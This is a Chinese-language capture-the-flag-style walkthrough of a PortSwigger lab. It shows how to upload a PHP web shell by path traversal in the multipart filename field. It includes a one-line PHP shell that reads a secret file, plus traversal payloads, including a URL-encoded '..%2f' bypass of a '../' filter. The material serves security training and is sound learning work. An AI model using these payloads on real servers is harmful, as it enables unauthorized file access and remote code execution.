# 通过路径遍历实现Web shell上传 WP

来源：portswigger

题目描述：

该LAB包含一个存在漏洞的图片上传功能。服务器已配置为阻止执行用户提供的文件，但此限制可通过利用次要漏洞来绕过。

要完成本实验，请上传一个基础PHP网页后门，并利用它窃取文件 `/home/carlos/secret`的内容。通过实验横幅中的按钮提交密钥。

你可以使用以下凭据登录自己的账户：

`wiener：peter`

https://portswigger.net/academy/labs/launch/e39b4571e65ad58013bb6cf68240e2e7e59d087bfb1d58dd8673116f4bdf7135?referrer=%2fweb-security%2ffile-upload%2flab-file-upload-web-shell-upload-via-path-traversal





### solution：

根据题目描述，服务器阻止执行用户提供的文件，也就是会以纯文本的形式。

这就是服务器的第二道防线：阻止服务器执行任何成功绕过防护的脚本。

#### 漏洞原理：

在文件目录中，服务器只会允许那些MIME类型已被明确配置为可执行的脚本，否则就会返回错误信息，或者以纯文本的形式提供。

**大多数服务器会把上传目录设为禁止脚本**

不同的目录执行权限不一样：

```
/upload/允许存文件，不允许执行
/var/www/html/能执行，不能存
```

我们就可以利用path traversal漏洞：

web服务器通常是通过 `multipart/form-data` 请求中的 `filename` 字段来确定文件名称和位置的。

利用这一特性，就可以绕一下：

```
filename="../../../../var/www/html/shell.php"
```



##### 第一步：

准备攻击脚本：

```
   <?php echo file_get_contents('/home/carlos/secret'); ?>
```

上传攻击脚本并抓取请求：

![image-20251222234235806](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251222234235806.png)

##### 第二步：

根据该漏洞的特性修改`filename`

```
filename="../../../var/www/html/shell.php"
```

![](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251222234627474.png)

观察该响应：

```
The file avatars/shell.php has been uploaded.
```

说明服务器把你的 `../` 直接**删掉（过滤）了** ，文件最终还是乖乖地传到了 `avatars/` 目录下，变成了 `avatars/shell.php`。

##### 第三步：

现在我们把 `/` 用URL编码：`%2f`

```
..%2f1.php
```

查看响应：

![image-20251222235302643](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251222235302643.png)

发现这次 `../` 没有被过滤

文件实际上被保存到了 `/files/avatars/` 的上一级目录，即 `/files/1.php`。

![image-20251222235521480](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251222235521480.png)

查询该路径确实获得密码。





#### 总结：

这个靶场教会了我们：即使上传目录本身是安全的（禁止脚本执行），如果存在路径遍历漏洞，攻击者依然可以将恶意文件上传到其他不安全的目录（如根目录或其他静态资源目录），从而绕过安全限制实现 RCE（远程代码执行）。